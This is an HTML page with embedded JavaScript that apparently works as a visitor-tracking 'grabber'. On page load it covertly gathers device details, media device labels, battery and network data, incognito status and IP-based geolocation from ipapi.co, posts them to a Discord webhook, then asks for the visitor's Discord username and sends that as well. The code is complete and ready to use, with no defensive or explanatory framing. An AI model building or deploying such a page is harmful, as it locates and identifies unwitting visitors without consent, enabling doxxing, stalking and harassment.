<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>di</title>
</head>
<body>
  <h1></h1>
  <p>Check your Discord channel connected to the webhook.</p>

  <script>
    const CONFIG = {
      webhookUrl: "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN",
      sendDeviceInfo: true,
      sendIPInfo: true,
      sendOnLoad: true,
      discordUsernamePrompt: true,
      usernameDefault: "[not provided]",
      maxUsernameLength: 128,
      sendDelay: 350
    };

    async function collectDeviceInfo() {
      const info = {};
      info.useragent = navigator.userAgent || null;
      info.platform = navigator.platform || null;
      info.vendor = navigator.vendor || null;
      info.language = navigator.language || null;
      info.languages = navigator.languages || null;
      info.cookieEnabled = navigator.cookieEnabled ? "Yes" : "Not";
      info.doNotTrack = navigator.doNotTrack ?? null;
      info.hardwareConcurrency = navigator.hardwareConcurrency ?? null;
      info.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory : null;
      info.product = navigator.product ?? null;
      info.webdriver = navigator.webdriver ?? null;

      if (window.screen) {
        info.screen = `${screen.width} x ${screen.height} x ${screen.colorDepth || 'unknown'}`;
        info.pixelratio = window.devicePixelRatio ?? 1;
        info.colordepth = screen.colorDepth ?? null;
      }

      const now = new Date();
      info.datetime = now.toString();
      info.date = now.toLocaleString();
      try { info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || null; } catch(e){ info.timezone = null; }
      info.offset = (() => { const o = -new Date().getTimezoneOffset() / 60; return (o >= 0 ? "+" : "") + o; })();

      try { if (navigator.getBattery) { const batt = await navigator.getBattery(); info.battery = Math.round(batt.level * 100) + "%"; } } catch(e){ info.battery = null; }

      try {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
          info.network = conn.type || "unknown";
          info.rtt = conn.rtt != null ? `${conn.rtt} ms` : null;
          info.downlink = conn.downlink != null ? `${conn.downlink} Mbps` : null;
          info.effectiveType = conn.effectiveType || null;
        }
      } catch(e){ info.network = null; }

      info.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 0) || false;
      info.touchsupport = info.touchSupport ? "Yes" : "Not";

      try {
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
          const devices = await navigator.mediaDevices.enumerateDevices();
          info.audiodevices = devices.filter(d => d.kind === 'audioinput').length ? "audioinput" : null;
          info.audioinput = devices.filter(d => d.kind === 'audioinput').map(d => d.label || d.deviceId) || [];
          info.audiooutput = devices.filter(d => d.kind === 'audiooutput').map(d => d.label || d.deviceId) || [];
          info.videoinput = devices.filter(d => d.kind === 'videoinput').map(d => d.label || d.deviceId) || [];
        }
      } catch(e){ info.audioinput = "permission or enumerate failed"; info.audiooutput = "permission or enumerate failed"; info.videoinput = "permission or enumerate failed"; }

      info.accelerometer = (typeof DeviceMotionEvent !== "undefined") ? "Yes" : "Not";
      info.gyroscope = (typeof DeviceOrientationEvent !== "undefined") ? "Yes" : "Not";
      info.forcedcolors = (window.matchMedia && window.matchMedia('(forced-colors: active)').matches) ? "Yes" : "Not";
      info.reducedmotion = (window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches) ? "Yes" : "Not";
      info.darkmode = (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? "Yes" : "Not";
      info.contrast = (window.matchMedia && window.matchMedia('(prefers-contrast: more)').matches) ? "More" : "Not";

      info.indexedDB = !!window.indexedDB;
      info.localStorage = (function(){ try { return !!localStorage; } catch(e) { return null; } })();
      info.sessionStorage = (function(){ try { return !!sessionStorage; } catch(e) { return null; } })();
      info.openDatabase = !!window.openDatabase;

      try { info.applepay = (window.ApplePaySession && ApplePaySession.canMakePayments && typeof ApplePaySession.canMakePayments === 'function') ? (await ApplePaySession.canMakePayments() ? "Yes" : "Not") : "Not"; } catch(e){ info.applepay = "Not"; }
      try { info.googlepay = (typeof PaymentRequest === 'function') ? "Supported" : "Not"; } catch(e){ info.googlepay = "Not"; }

      info.pixelratio = window.devicePixelRatio ?? 1;
      try {
        const gamut = (window.matchMedia && window.matchMedia('(color-gamut: p3)').matches) ? 'p3'
                    : (window.matchMedia && window.matchMedia('(color-gamut: rec2020)').matches) ? 'rec2020'
                    : 'srgb';
        info.colorgamut = gamut;
      } catch(e){ info.colorgamut = null; }

      info.monochrome = (window.matchMedia && window.matchMedia('(monochrome)').matches) ? "Yes" : "Not";
      info.colordepth = screen.colorDepth ?? null;
      info.cookiesenabled = navigator.cookieEnabled ? "Yes" : "Not";
      info.language = navigator.language || null;
      info.languages_list = navigator.languages || null;
      info.vendor = navigator.vendor || null;

      info.browser = (function() {
        const ua = navigator.userAgent || "";
        if (/Chrome\/(\d+)/.test(ua) && /Edg\//.test(ua) === false) return "Chrome";
        if (/Edg\//.test(ua)) return "Edge";
        if (/Firefox\//.test(ua)) return "Firefox";
        if (/Safari\//.test(ua) && /Chrome\//.test(ua) === false) return "Safari";
        return "Unknown";
      })();

      info.RAM = navigator.deviceMemory ? navigator.deviceMemory + " Gb" : null;
      info["CPU Threads"] = navigator.hardwareConcurrency || null;
      info.referer = document.referrer || null;

      info.incognito = null;
      try {
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (!fs) info.incognito = "Not detectable";
        else fs(window.TEMPORARY, 100, () => { info.incognito = "Not"; }, () => { info.incognito = "Yes"; });
      } catch(e){ info.incognito = "Unknown"; }

      info.fingerprint = null;

      return info;
    }

    async function fetchIPInfo() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (!res.ok) throw new Error();
        return await res.json();
      } catch(e){ return { ip: null }; }
    }

    function buildMessageBlock(allData, usernamePrefix = "") {
      const json = JSON.stringify(allData, null, 2);
      const maxChars = 1900;
      return (usernamePrefix ? usernamePrefix + "\n\n" : "") + "```json\n" + (json.length > maxChars ? json.slice(0, maxChars) + "\n...TRUNCATED\n" : json) + "\n```";
    }

    async function sendToWebhook(payloadString) {
      await fetch(CONFIG.webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: payloadString })
      });
    }

    (async () => {
      const deviceInfo = CONFIG.sendDeviceInfo ? await collectDeviceInfo() : {};
      const ipData = CONFIG.sendIPInfo ? await fetchIPInfo() : {};

      const merged = {
        ip: ipData.ip ?? null,
        country: ipData.country_name ?? ipData.country ?? null,
        city: ipData.city ?? null,
        state: ipData.region ?? null,
        latitude: ipData.latitude ?? ipData.lat ?? null,
        longitude: ipData.longitude ?? ipData.lon ?? null,
        accuracy: ipData['accuracy'] ?? ipData['accuracy-radius'] ?? "ip",
        isp: ipData.org ?? null,
        ...deviceInfo,
        referer: document.referrer || deviceInfo.referer,
        datetime: new Date().toString(),
      };
      merged.fingerprint = merged.fingerprint || "N/A";

      if (CONFIG.sendOnLoad) await sendToWebhook(buildMessageBlock(merged, ""));

      if (CONFIG.discordUsernamePrompt) {
        let discordUsername = prompt("Please enter your Discord username (e.g. MyName#1234):");
        if (discordUsername !== null) discordUsername = String(discordUsername).trim().slice(0, CONFIG.maxUsernameLength);
        if (!discordUsername) discordUsername = CONFIG.usernameDefault;
        await new Promise(res => setTimeout(res, CONFIG.sendDelay));
        await sendToWebhook(buildMessageBlock(merged, `Discord Username: ${discordUsername}`));
      }
    })();
  </script>
</body>
</html>
